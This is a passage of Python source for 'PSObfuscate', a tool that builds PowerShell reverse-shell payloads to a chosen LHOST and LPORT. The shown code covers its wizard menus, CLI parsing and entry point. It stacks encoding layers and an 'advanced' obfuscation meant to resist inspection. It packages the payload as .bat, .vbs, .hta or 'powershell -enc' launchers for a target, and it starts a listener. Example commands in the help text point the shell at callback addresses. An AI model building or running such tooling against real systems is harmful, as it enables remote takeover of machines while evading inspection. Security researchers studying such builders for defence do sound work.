            print(_settings_row('Target', f"{lhost}:{lport}"))
        else:
            sf = os.path.basename(source_file) if source_file else 'File'
            print(_settings_row('Source file', sf))
        print(_settings_row('Encoding', enc_label))
        print(_box_bot())

        print()
        show_menu([
            ('Enter', 'Build payload'),
            ('e', 'Edit a field'),
            ('0', 'Start over'),
        ])

        while True:
            sel = ask("Selection", "default: Build").lower()
            if sel in ('', 'enter'):
                return lhost, lport, transforms, source_file, custom_payload
            if sel == '0':
                return None

            if sel == 'e':
                edit_items = []
                if source == SOURCE_BUILTIN:
                    edit_items.append(('1', 'LHOST'))
                    edit_items.append(('2', 'LPORT'))
                    edit_items.append(('3', 'Encoding'))
                else:
                    edit_items.append(('1', 'Encoding'))
                print()
                show_menu(edit_items)
                edit_sel = ask("Selection")

                if source == SOURCE_BUILTIN:
                    if edit_sel == '1':
                        addr = collect_callback_address(
                            1, 3, allow_cancel=True,
                            source=source, lhost=lhost, lport=lport, transforms=transforms)
                        if addr is not None:
                            lhost = addr
                        break
                    if edit_sel == '2':
                        port = collect_callback_port(
                            2, 3, allow_cancel=True,
                            source=source, lhost=lhost, lport=lport, transforms=transforms)
                        if port is not None:
                            lport = port
                        break
                    if edit_sel == '3':
                        transforms = collect_encoding(
                            3, 3, allow_advanced=True,
                            source=source, lhost=lhost, lport=lport)
                        break
                else:
                    if edit_sel == '1':
                        transforms = collect_encoding(
                            2, 2, allow_advanced=False,
                            source=source, source_file=source_file)
                        break
                continue

            print(f"{R}[!]{RS} Press Enter, e, or 0.")


def _settings_row(label, value):
    """Build a settings row: label (22 wide) + value, fitting _BOX_W."""
    max_val = _BOX_W - 23
    s = str(value)
    if len(s) > max_val:
        s = s[:max_val - 3] + '...'
    content = f" {W}{label:<22}{RS}{s}"
    return _box_row(content)


def _redraw_payload_ready(result, wrapper):
    """Clear and redraw the Payload Ready screen with boxed summary."""
    clear_screen()
    config_bar(source=result.source, source_file=result.source_file,
               lhost=result.lhost, lport=result.lport,
               transforms=result.transforms)

    output = WRAPPER_MAP[wrapper](result.raw_payload)
    lines = output.count('\n') + 1
    chars = len(output)
    size_str = f"{chars:,} chars \u00b7 {lines} line{'s' if lines != 1 else ''}"

    print(f"\n{_box_top()}")
    print(_box_row(f" {G}\u2714{RS}  {W}Payload Ready{RS}"))
    print(_box_mid())
    print(_settings_row('Format', WRAPPER_LABELS[wrapper]))
    print(_settings_row('Output size', size_str))
    print(_box_mid())
    max_preview = _BOX_W - 4
    preview = output[:max_preview]
    if len(output) > max_preview:
        preview += '...'
    for pline in preview.split('\n'):
        if len(pline) > max_preview:
            pline = pline[:max_preview] + '...'
        print(_box_row(f" {DM}{pline}{RS}"))
    print(_box_bot())

    items = [
        ('1', 'Print to screen'),
        ('2', 'Save to file'),
        ('3', 'Copy to clipboard'),
        ('4', 'Change encoding'),
        ('5', 'Change delivery format'),
        ('6', 'Start listener'),
    ]
    if _http_is_running():
        items.append(('7', f'Stop listener', f'HTTP :{_http_port}'))
        items.append(('8', 'New payload'))
    else:
        items.append(('7', 'New payload'))
    items.append(('0', 'Exit'))
    section('Actions')
    show_menu(items)


def _print_full_payload(content):
    """Print the full payload to screen with separators."""
    print(f"\n{SEP}")
    print(content)
    print(SEP)


def _screen_delivery_format(result, current_wrapper):
    """Full-screen delivery format selection. Returns new wrapper or current if cancelled."""
    clear_screen()
    config_bar(source=result.source, source_file=result.source_file,
               lhost=result.lhost, lport=result.lport,
               transforms=result.transforms)

    section('Delivery Format')
    print(f"{DM}Current:{RS}  {W}{WRAPPER_LABELS[current_wrapper]}{RS}")

    items = []
    for num, _, label, desc in WRAPPER_MENU:
        items.append((num, f"{label:<20}", desc))
    items.append(('0', 'Back'))
    print()
    show_menu(items)

    while True:
        val = ask("Selection", "0: Back")
        if val == '0' or not val:
            return current_wrapper
        if val in WRAPPER_BY_KEY:
            return WRAPPER_BY_KEY[val]
        print(f"{R}[!]{RS} Choose 0\u20135.")


def _screen_encoding(result, allow_advanced, custom_payload):
    """Full-screen encoding selection. Returns (result, changed) with rebuilt payload if changed."""
    clear_screen()
    config_bar(source=result.source, source_file=result.source_file,
               lhost=result.lhost, lport=result.lport,
               transforms=result.transforms)

    section('Encoding')
    print(f"{DM}Current:{RS}  {W}{result.transform_label}{RS}")

    def redraw():
        clear_screen()
        config_bar(source=result.source, source_file=result.source_file,
                   lhost=result.lhost, lport=result.lport,
                   transforms=result.transforms)
        section('Encoding')
        print(f"{DM}Current:{RS}  {W}{result.transform_label}{RS}")

    new_transforms = _prompt_transformation(allow_advanced, screen_redraw=redraw)
    if new_transforms != result.transforms:
        result = build(
            result.lhost, result.lport, new_transforms,
            custom_payload=custom_payload,
            source_file=result.source_file,
        )
        return result, True
    return result, False


def payload_ready_actions(result, custom_payload=None):
    """Post-build action loop. Returns when user wants a new build."""
    wrapper = WRAPPER_RAW
    allow_advanced = result.source == SOURCE_BUILTIN
    saved_filename = ''

    _redraw_payload_ready(result, wrapper)
    menu_has_stop = _http_is_running()

    while True:
        sel = ask("Selection")

        if sel == '1':
            output = WRAPPER_MAP[wrapper](result.raw_payload)
            _print_full_payload(output)

        elif sel == '2':
            output = WRAPPER_MAP[wrapper](result.raw_payload)
            saved = _save_payload(wrapper, output)
            if saved:
                saved_filename = saved
                yn = ask("Start listener?", "y/n").lower()
                if yn in ('y', 'yes'):
                    _start_listeners(result.lport, lhost=result.lhost, filename=saved_filename)
                    _redraw_payload_ready(result, wrapper)
                    menu_has_stop = _http_is_running()

        elif sel == '3':
            output = WRAPPER_MAP[wrapper](result.raw_payload)
            _do_copy(output)

        elif sel == '4':
            result, _ = _screen_encoding(result, allow_advanced, custom_payload)
            _redraw_payload_ready(result, wrapper)
            menu_has_stop = _http_is_running()

        elif sel == '5':
            wrapper = _screen_delivery_format(result, wrapper)
            _redraw_payload_ready(result, wrapper)
            menu_has_stop = _http_is_running()

        elif sel == '6':
            _start_listeners(result.lport, lhost=result.lhost, filename=saved_filename)
            _redraw_payload_ready(result, wrapper)
            menu_has_stop = _http_is_running()

        elif sel == '7' and menu_has_stop:
            _stop_listeners()
            _redraw_payload_ready(result, wrapper)
            menu_has_stop = _http_is_running()

        elif sel == '7' and not menu_has_stop:
            return

        elif sel == '8' and menu_has_stop:
            return

        elif sel == '0':
            print(f"\n{DM}Exiting.{RS}")
            sys.exit(0)

        elif sel:
            max_opt = '8' if menu_has_stop else '7'
            print(f"{R}[!]{RS} Choose 0\u2013{max_opt}.")

        else:
            _redraw_payload_ready(result, wrapper)
            menu_has_stop = _http_is_running()


def _do_copy(content):
    """Copy to clipboard and print result."""
    if _copy_to_clipboard(content):
        print(f"\n{G}\u2714{RS} Copied to clipboard.")
    else:
        print(f"\n{Y}[!]{RS} Clipboard tool not found {DM}(install pbcopy / xclip / xsel){RS}")


def _suggested_filename(wrapper):
    """Return the suggested filename for a wrapper type."""
    if wrapper == WRAPPER_ENCODED:
        return 'launcher.txt'
    return f"payload{WRAPPER_EXTENSIONS[wrapper]}"


def _save_payload(wrapper, content):
    """Save payload to file. Returns filename if saved, False otherwise."""
    default_name = _suggested_filename(wrapper)

    raw = ask("Filename", f"default: {default_name}, 0: Cancel")
    if raw == '0':
        print(f"\n{DM}[-]{RS} Save cancelled.")
        return False
    if not raw:
        raw = default_name

    ext = WRAPPER_EXTENSIONS[wrapper]
    filename = raw if os.path.splitext(raw)[1] else raw + ext

    overwrite = False
    while os.path.exists(filename) and not overwrite:
        print(f"\n{Y}[!]{RS} File already exists: {W}{filename}{RS}")

        print()
        show_menu([
            ('1', 'Overwrite'),
            ('2', 'Enter new filename'),
            ('0', 'Cancel'),
        ])

        resolved = False
        while not resolved:
            sel = ask("Selection", "0: Cancel")
            if sel == '1':
                overwrite = True
                resolved = True
            elif sel == '2':
                raw2 = ask("Filename", "0: Cancel")
                if raw2 == '0':
                    print(f"\n{DM}[-]{RS} Save cancelled.")
                    return False
                if not raw2:
                    continue
                filename = raw2 if os.path.splitext(raw2)[1] else raw2 + ext
                resolved = True
            elif sel == '0':
                print(f"\n{DM}[-]{RS} Save cancelled.")
                return False
            elif not sel:
                continue
            else:
                print(f"{R}[!]{RS} Choose 0\u20132.")

    try:
        with open(filename, 'w') as f:
            f.write(content)
        full_path = os.path.abspath(filename)

        print(f"\n{G}\u2714{RS} Saved: {W}{full_path}{RS}")
        return filename
    except OSError as e:
        print(f"\n{R}[!]{RS} {e}")
        return False


# ══════════════════════════════════════════════════════════════════════════════
#  Non-Interactive Mode
# ══════════════════════════════════════════════════════════════════════════════

def run_direct(ip, port, transforms, output_file=None, wrapper=WRAPPER_RAW,
               custom_payload=None, source_file='', quiet=False):
    """Non-interactive generation from CLI arguments."""
    result = build(ip, port, transforms, wrapper=wrapper,
                   custom_payload=custom_payload, source_file=source_file)

    if quiet:
        print(result.rendered)
    else:
        print(BANNER)
        print(f"\n{SEP}\n")
        print(f"{G}\u2714{RS} {W}Payload ready{RS}  "
              f"{DM}\u00b7 {result.transform_label} \u00b7 {result.wrapper_label} "
              f"\u00b7 {result.char_count:,} chars \u00b7 {result.line_count} line"
              f"{'s' if result.line_count > 1 else ''}{RS}\n")
        print(SEP)
        print()
        print(result.rendered)
        print()
        print(SEP)

    if output_file:
        if not quiet and os.path.exists(output_file):
            print(f"{Y}[!]{RS} Overwriting {Y}{output_file}{RS}\n")
        try:
            with open(output_file, 'w') as f:
                f.write(result.rendered)
            if not quiet:
                print(f"{G}\u2714{RS} Saved to {Y}{output_file}{RS}\n")
        except OSError as e:
            print(f"{R}[!]{RS} Could not save: {e}\n", file=sys.stderr)
            sys.exit(1)

    return result


# ══════════════════════════════════════════════════════════════════════════════
#  CLI Argument Parsing
# ══════════════════════════════════════════════════════════════════════════════

def build_parser():
    p = argparse.ArgumentParser(
        prog='PSObfuscate',
        description='PSObfuscate \u2014 PowerShell Payload Builder & Obfuscator\nhttp://github.com/01xmm',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            'examples:\n'
            '  PsObfuscate.py                               interactive wizard\n'
            '  PsObfuscate.py -i 10.0.0.1 -p 4444           built-in shell, no transform\n'
            '  PsObfuscate.py -i 10.0.0.1 -p 4444 -t A      advanced obfuscation\n'
            '  PsObfuscate.py -i 10.0.0.1 -p 4444 -t 6,1    stack Reverse + Base64\n'
            '  PsObfuscate.py -i 10.0.0.1 -p 4444 -d bat    deliver as .bat file\n'
            '  PsObfuscate.py -f script.ps1 -t 1            base64-encode a custom file\n'
            '  PsObfuscate.py -i 10.0.0.1 -p 4444 -q        payload only, for piping\n'
            '  PsObfuscate.py --list                        all encoding layers & delivery formats\n'
        ),
    )
    p.add_argument('-i', dest='ip',        metavar='HOST',
                   help='LHOST (IP or hostname)')
    p.add_argument('-p', dest='port',      metavar='PORT', type=int,
                   help='LPORT (1\u201365535)')
    p.add_argument('-f', dest='file',      metavar='FILE',
                   help='use a custom .ps1 file instead of built-in shell')
    p.add_argument('-t', dest='transform', metavar='LAYER', default=None,
                   help='N=none (default), 1\u20136=encoding, A=advanced, or stack: 6,1')
    p.add_argument('-d', dest='wrapper',   metavar='TYPE', default='raw',
                   choices=['raw', 'encoded', 'bat', 'vbs', 'hta'],
                   help='delivery format: raw encoded bat vbs hta (default: raw)')
    p.add_argument('-o', dest='output',    metavar='FILE',
                   help='save output to file')
    p.add_argument('-q', dest='quiet',     action='store_true',
                   help='payload only \u2014 no banner, no formatting')
    p.add_argument('--no-color',           action='store_true',
                   help='disable colored output')
    p.add_argument('--list',               action='store_true',
                   help='show all encoding layers and delivery formats')
    return p


def parse_transform_arg(raw):
    raw = raw.upper().replace(' ', '')
    tokens = [t.strip() for t in raw.split(',') if t.strip()]
    if 'N' in tokens:
        return ['N']
    if not tokens or 'A' in tokens:
        return ['A']
    valid   = [t for t in tokens if t in LAYER_MAP]
    invalid = [t for t in tokens if t not in VALID_TRANSFORM_KEYS]
    if invalid:
        print(f"{Y}[!]{RS} Unknown encoding{'s' if len(invalid) > 1 else ''}: "
              f"{', '.join(invalid)}", file=sys.stderr)
    if not valid:
        print(f"{R}[!]{RS} No valid encoding given. Use -t N, 1\u20136, or A.", file=sys.stderr)
        sys.exit(1)
    return valid


def print_transform_list():
    print(BANNER)

    print(f"{W}Encoding Layers{RS}  {DM}(-t){RS}")
    print(f"{DM}{'\u2500' * 15}{RS}")
    print(f"{DM}Layers 1\u20136 are reversible encoding wrappers. At runtime, PowerShell{RS}")
    print(f"{DM}decodes and executes via IEX. Stack layers with commas (e.g. -t 6,1).{RS}")
    print(f"{DM}Advanced (A) rewrites the payload structure \u2014 not just encoding.{RS}")
    print()

    _TRANSFORM_HELP = [
        ('N', 'None',       'No transform \u2014 raw script as-is',
                            'Plaintext \u2014 trivially readable'),
        ('1', 'Base64',     'UTF-16LE Base64, decoded via IEX at runtime',
                            '[Convert]::FromBase64String() \u2014 trivially reversible'),
        ('2', 'Hex',        'Hex pairs, decoded via IEX at runtime',
                            'ToInt32($_, 16) \u2014 trivially reversible'),
        ('3', 'ASCII',      'Decimal char codes, decoded via IEX at runtime',
                            '[char][int] join \u2014 trivially reversible'),
        ('4', 'URL Encode', 'Percent-encoded, decoded via IEX at runtime',
                            '[uri]::UnescapeDataString() \u2014 trivially reversible'),
        ('5', 'Binary',     '8-bit binary strings, decoded via IEX at runtime',
                            'ToInt32($_, 2) \u2014 trivially reversible'),
        ('6', 'Reverse',    'Reversed string, rebuilt via IEX at runtime',
                            '[-1..-n] -join \u2014 trivially reversible'),
        ('A', 'Advanced',   'Randomized vars, char-array cmdlets, arithmetic noise',
                            'Resists casual inspection, not static analysis'),
    ]
    for key, label, desc, tech in _TRANSFORM_HELP:
        print(f"  {C}[{key}]{RS}  {W}{label:<14}{RS}  {desc}")
        print(f"       {' ' * 14}  {DM}{tech}{RS}")

    print(f"\n  {DM}Advanced obfuscation inspired by I-Am-Jakoby.{RS}")
    print(f"  {DM}Built-in payload only \u2014 not available for custom files.{RS}")

    print(f"\n{W}Delivery Formats{RS}  {DM}(-d){RS}")
    print(f"{DM}{'\u2500' * 16}{RS}")
    print(f"{DM}Controls how the payload is packaged for the target.{RS}")
    print()

    _DELIVERY_HELP = [
        ('raw',     'Raw script',       '.ps1', 'Plain PowerShell, run directly'),
        ('encoded', 'Encoded launcher', '.txt', 'powershell -enc one-liner'),
        ('bat',     'CMD launcher',     '.bat', 'Batch file, double-click or cmd.exe'),
        ('vbs',     'VBS launcher',     '.vbs', 'VBScript via Windows Script Host'),
        ('hta',     'HTA launcher',     '.hta', 'HTML Application via mshta.exe'),
    ]
    for key, label, ext, desc in _DELIVERY_HELP:
        print(f"  {C}{key:<8}{RS} {W}{label:<18}{RS} {DM}{ext:<6}{RS} {desc}")
    print()


# ══════════════════════════════════════════════════════════════════════════════
#  Entry Point
# ══════════════════════════════════════════════════════════════════════════════

def main():
    args = build_parser().parse_args()

    if args.no_color or args.quiet:
        _reload_colors(False)

    if args.list:
        print_transform_list()
        sys.exit(0)

    if args.file and (args.ip or args.port):
        print(f"\n{R}[!]{RS} {W}-f{RS} and {W}-i/-p{RS} are mutually exclusive.\n",
              file=sys.stderr)
        sys.exit(1)

    if args.file:
        fpath = os.path.expanduser(args.file)
        if not os.path.isfile(fpath):
            print(f"\n{R}[!]{RS} File not found: {fpath}\n", file=sys.stderr)
            sys.exit(1)
        try:
            with open(fpath, 'r') as f:
                custom_payload = f.read()
        except OSError as e:
            print(f"\n{R}[!]{RS} Cannot read file: {e}\n", file=sys.stderr)
            sys.exit(1)
        if not custom_payload.strip():
            print(f"\n{R}[!]{RS} File is empty.\n", file=sys.stderr)
            sys.exit(1)
        if args.transform is None:
            transforms = ['N']
        else:
            transforms = parse_transform_arg(args.transform)
            if transforms == ['A']:
                print(f"{Y}[!]{RS} Advanced is not available for custom payloads. Using Base64.",
                      file=sys.stderr)
                transforms = ['1']
        run_direct('', 0, transforms, args.output, wrapper=args.wrapper,
                   custom_payload=custom_payload, source_file=fpath,
                   quiet=args.quiet)
        return

    if args.ip and args.port:
        if not is_valid_target(args.ip):
            print(f"\n{R}[!]{RS} Invalid LHOST: {args.ip}\n", file=sys.stderr)
            sys.exit(1)
        if not (1 <= args.port <= 65535):
            print(f"\n{R}[!]{RS} Port must be 1\u201365535.\n", file=sys.stderr)
            sys.exit(1)
        transforms = parse_transform_arg(args.transform or 'N')
        run_direct(args.ip, args.port, transforms, args.output,
                   wrapper=args.wrapper, quiet=args.quiet)
        return

    if args.ip and not args.port:
        print(f"\n{R}[!]{RS} Missing {W}-p{RS}. "
              f"Both {W}-i{RS} and {W}-p{RS} are required.\n", file=sys.stderr)
        sys.exit(1)
    if args.port and not args.ip:
        print(f"\n{R}[!]{RS} Missing {W}-i{RS}. "
              f"Both {W}-i{RS} and {W}-p{RS} are required.\n", file=sys.stderr)
        sys.exit(1)

    # Interactive mode
    while True:
        try:
            source = collect_payload_source()

            if source == SOURCE_BUILTIN:
                lhost = collect_callback_address(
                    1, 3, allow_cancel=True,
                    source=SOURCE_BUILTIN)
                if lhost is None:
                    continue

                lport = collect_callback_port(
                    2, 3, allow_cancel=True,
                    source=SOURCE_BUILTIN, lhost=lhost)
                if lport is None:
                    continue

                transforms = collect_encoding(
                    3, 3, allow_advanced=True,
                    source=SOURCE_BUILTIN, lhost=lhost, lport=lport)

                settings = review_build(source, lhost, lport, transforms, '', None)
                if settings is None:
                    continue
                lhost, lport, transforms, _, _ = settings
                result = build(lhost, lport, transforms)
                payload_ready_actions(result)
            else:
                file_result = collect_input_file(
                    1, 2,
                    source=SOURCE_FILE)
                if file_result is None:
                    continue
                custom_payload, source_file = file_result

                transforms = collect_encoding(
                    2, 2, allow_advanced=False,
                    source=SOURCE_FILE, source_file=source_file)

                result = build('', 0, transforms,
                               custom_payload=custom_payload,
                               source_file=source_file)
                payload_ready_actions(result, custom_payload=custom_payload)

        except KeyboardInterrupt:
            print(f"\n\n{DM}Aborted.{RS}\n")
            sys.exit(0)


if __name__ == "__main__":
    main()